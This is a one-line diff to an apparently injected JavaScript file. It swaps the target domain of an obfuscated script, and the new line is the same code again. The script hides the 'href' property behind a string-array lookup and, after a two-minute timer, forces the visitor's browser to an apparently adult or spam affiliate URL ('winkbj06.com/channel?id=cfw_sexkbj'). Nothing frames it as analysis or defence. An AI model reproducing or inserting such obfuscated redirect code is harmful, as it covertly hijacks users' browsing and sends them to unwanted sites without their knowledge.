@@ -1,1 +1,1 @@
-var _0x1c5a=['href'];var _0x4377=function(_0x1c5ac4,_0x43770d){_0x1c5ac4=_0x1c5ac4-0x0;var _0x5cb601=_0x1c5a[_0x1c5ac4];return _0x5cb601;};function jump_winkbj(){window['location'][_0x4377('0x0')]='https://www.winkbj05.com/channel?id=cfw_sexkbj';}setTimeout(jump_winkbj,0x1d4c0);
+var _0x1c5a=['href'];var _0x4377=function(_0x1c5ac4,_0x43770d){_0x1c5ac4=_0x1c5ac4-0x0;var _0x5cb601=_0x1c5a[_0x1c5ac4];return _0x5cb601;};function jump_winkbj(){window['location'][_0x4377('0x0')]='https://www.winkbj06.com/channel?id=cfw_sexkbj';}setTimeout(jump_winkbj,0x1d4c0);
